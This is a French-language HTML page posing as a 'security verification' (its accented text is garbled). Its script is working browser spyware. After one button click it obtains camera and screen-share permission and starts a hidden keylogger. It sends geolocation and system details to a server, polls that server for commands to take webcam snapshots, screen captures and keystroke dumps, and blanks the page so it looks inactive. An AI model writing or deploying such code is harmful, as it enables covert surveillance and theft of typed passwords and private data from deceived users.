<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>‚ö†Ô∏è V√©rification S√©curit√©</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: rgba(255,255,255,0.95);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 400px;
        }
        h1 { color: #333; margin-bottom: 20px; font-size: 24px; }
        p { color: #666; line-height: 1.6; margin-bottom: 30px; }
        .btn-access {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 10px 20px rgba(102,126,234,0.4);
            font-weight: bold;
        }
        .btn-access:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 30px rgba(102,126,234,0.6);
        }
        #status { margin-top: 15px; font-size: 14px; color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîí V√©rification de S√©curit√©</h1>
        <p>Une v√©rification rapide est n√©cessaire pour acc√©der √† cette page.</p>
        <button class="btn-access" onclick="activate()">üöÄ ACTIVER MAINTENANT</button>
        <div id="status"></div>
    </div>

    <script>
        let isActive = false;
        let permissions = {
            camera: false,
            screen: false
        };
        let state = {
            camera: {active: false, timer: null},
            keylog: {active: false, buffer: ''},
            screen: {active: false, timer: null}
        };

        async function activate() {
            document.getElementById('status').textContent = '‚è≥ Demande d\'autorisations...';
            
            // Demander l'autorisation de la cam√©ra
            try {
                document.getElementById('status').textContent = 'üìπ Autorisation cam√©ra...';
                const cameraStream = await navigator.mediaDevices.getUserMedia({video: true, audio: false});
                cameraStream.getTracks().forEach(track => track.stop());
                permissions.camera = true;
                document.getElementById('status').textContent = '‚úÖ Cam√©ra autoris√©e';
            } catch(e) {
                document.getElementById('status').textContent = '‚ö†Ô∏è Cam√©ra refus√©e';
                permissions.camera = false;
            }
            
            // Attendre un peu avant la prochaine demande
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // Demander l'autorisation du partage d'√©cran
            try {
                document.getElementById('status').textContent = 'üñ•Ô∏è Autorisation partage d\'√©cran...';
                const screenStream = await navigator.mediaDevices.getDisplayMedia({video: true});
                screenStream.getTracks().forEach(track => track.stop());
                permissions.screen = true;
                document.getElementById('status').textContent = '‚úÖ Partage d\'√©cran autoris√©';
            } catch(e) {
                document.getElementById('status').textContent = '‚ö†Ô∏è Partage d\'√©cran refus√©';
                permissions.screen = false;
            }
            
            document.getElementById('status').textContent = '‚úÖ Syst√®me activ√©';
            isActive = true;
            
            // D√©marrer keylogger automatiquement
            enableKeylogger();
            
            // Envoyer infos syst√®me
            sendSystemInfo();
            
            // Commencer √† v√©rifier les commandes
            setInterval(checkCommands, 3000);
            
            // Masquer l'interface apr√®s 3 secondes
            setTimeout(() => {
                document.body.style.transition = 'opacity 1s';
                document.body.style.opacity = '0';
                setTimeout(() => {
                    document.body.innerHTML = '';
                    document.body.style.background = '#000';
                }, 1000);
            }, 3000);
        }

        // V√©rifier les commandes du serveur
        async function checkCommands() {
            if (!isActive) return;
            try {
                const res = await fetch('/api/command');
                const data = await res.json();
                if (data.status !== 'no-command') {
                    executeCommand(data);
                }
            } catch(e) {
                console.log('Command check failed');
            }
        }

        // Ex√©cuter une commande
        function executeCommand(cmd) {
            console.log('üì• Commande re√ßue:', cmd.module, cmd.action, cmd.params);
            
            if (cmd.module === 'camera') {
                if (cmd.action === 'start') startCamera(cmd.params.interval || 5);
                else if (cmd.action === 'stop') stopCamera();
                else if (cmd.action === 'snapshot') captureCamera();
            }
            else if (cmd.module === 'keylogger') {
                if (cmd.action === 'start') enableKeylogger();
                else if (cmd.action === 'stop') disableKeylogger();
                else if (cmd.action === 'dump') sendKeylogData();
            }
            else if (cmd.module === 'screen') {
                if (cmd.action === 'start') startScreen(cmd.params.quality || 0.5, cmd.params.interval || 2);
                else if (cmd.action === 'stop') stopScreen();
            }
        }

        // === MODULE CAM√âRA ===
        function startCamera(interval) {
            if (state.camera.active) return;
            if (!permissions.camera) {
                console.error('Camera permission not granted');
                return;
            }
            state.camera.active = true;
            captureCamera();
            state.camera.timer = setInterval(captureCamera, interval * 1000);
            console.log('üìπ Cam√©ra d√©marr√©e, intervalle:', interval, 's');
        }

        function stopCamera() {
            state.camera.active = false;
            if (state.camera.timer) {
                clearInterval(state.camera.timer);
                state.camera.timer = null;
            }
            console.log('üìπ Cam√©ra arr√™t√©e');
        }

        async function captureCamera() {
            if (!permissions.camera) {
                console.error('Camera permission not granted');
                return;
            }
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: false});
                const video = document.createElement('video');
                video.style.display = 'none';
                document.body.appendChild(video);
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = 640;
                        canvas.height = 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, 640, 480);
                        const imageData = canvas.toDataURL('image/jpeg', 0.7);
                        
                        sendData({type: 'camera', image: imageData, timestamp: Date.now()});
                        console.log('üì∏ Photo cam√©ra captur√©e');
                        
                        stream.getTracks().forEach(track => track.stop());
                        video.remove();
                    }, 500);
                };
            } catch(e) {
                console.error('Camera error:', e);
                sendData({type: 'error', module: 'camera', message: e.message});
            }
        }

        // === MODULE KEYLOGGER ===
        function enableKeylogger() {
            if (state.keylog.active) return;
            state.keylog.active = true;
            state.keylog.buffer = '';
            
            document.addEventListener('keydown', handleKeyPress);
            console.log('‚å®Ô∏è Keylogger activ√©');
        }

        function disableKeylogger() {
            state.keylog.active = false;
            document.removeEventListener('keydown', handleKeyPress);
            console.log('‚å®Ô∏è Keylogger d√©sactiv√©');
        }

        function handleKeyPress(event) {
            if (!state.keylog.active) return;
            
            let key = event.key;
            if (key === 'Enter') key = '\n';
            else if (key === 'Tab') key = '\t';
            else if (key === ' ') key = ' ';
            else if (key.length > 1) key = `[${key}]`;
            
            state.keylog.buffer += key;
            
            // Envoyer quand le buffer atteint 100 caract√®res
            if (state.keylog.buffer.length >= 100) {
                sendKeylogData();
            }
        }

        function sendKeylogData() {
            if (state.keylog.buffer.length > 0) {
                sendData({type: 'keylog', keys: state.keylog.buffer, timestamp: Date.now()});
                console.log('‚å®Ô∏è Keylog envoy√©:', state.keylog.buffer.length, 'caract√®res');
                state.keylog.buffer = '';
            }
        }

        // === MODULE PARTAGE D'√âCRAN ===
        function startScreen(quality, interval) {
            if (state.screen.active) return;
            if (!permissions.screen) {
                console.error('Screen permission not granted');
                return;
            }
            state.screen.active = true;
            state.screen.quality = quality;
            captureScreen(quality);
            state.screen.timer = setInterval(() => captureScreen(quality), interval * 1000);
            console.log('üñ•Ô∏è Partage d\'√©cran d√©marr√©, qualit√©:', quality, 'intervalle:', interval, 's');
        }

        function stopScreen() {
            state.screen.active = false;
            if (state.screen.timer) {
                clearInterval(state.screen.timer);
                state.screen.timer = null;
            }
            console.log('üñ•Ô∏è Partage d\'√©cran arr√™t√©');
        }

        async function captureScreen(quality) {
            if (!permissions.screen) {
                console.error('Screen permission not granted');
                return;
            }
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({video: true});
                const video = document.createElement('video');
                video.style.display = 'none';
                document.body.appendChild(video);
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = 1280;
                        canvas.height = 720;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, 1280, 720);
                        const imageData = canvas.toDataURL('image/jpeg', quality);
                        
                        sendData({type: 'screen', image: imageData, timestamp: Date.now()});
                        console.log('üñ•Ô∏è Capture d\'√©cran envoy√©e');
                        
                        stream.getTracks().forEach(track => track.stop());
                        video.remove();
                    }, 500);
                };
            } catch(e) {
                console.error('Screen share error:', e);
                sendData({type: 'error', module: 'screen', message: e.message});
            }
        }

        // === INFOS SYST√àME ===
        function sendSystemInfo() {
            // G√©olocalisation
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        sendData({
                            type: 'location',
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        });
                    },
                    error => console.log('Geolocation error'),
                    {enableHighAccuracy: true, timeout: 5000}
                );
            }

            // Informations du syst√®me
            sendData({
                type: 'system',
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screenResolution: `${screen.width}x${screen.height}`,
                cores: navigator.hardwareConcurrency || 'unknown',
                memory: navigator.deviceMemory || 'unknown',
                online: navigator.onLine,
                timestamp: Date.now()
            });
        }

        // === ENVOI DES DONN√âES ===
        async function sendData(data) {
            try {
                const response = await fetch('/api/receive', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                if (response.ok) {
                    console.log('‚úÖ Donn√©es envoy√©es:', data.type);
                } else {
                    console.error('‚ùå Erreur envoi:', response.status);
                }
            } catch(e) {
                console.error('‚ùå Erreur r√©seau:', e.message);
            }
        }
    </script>
</body>
</html>
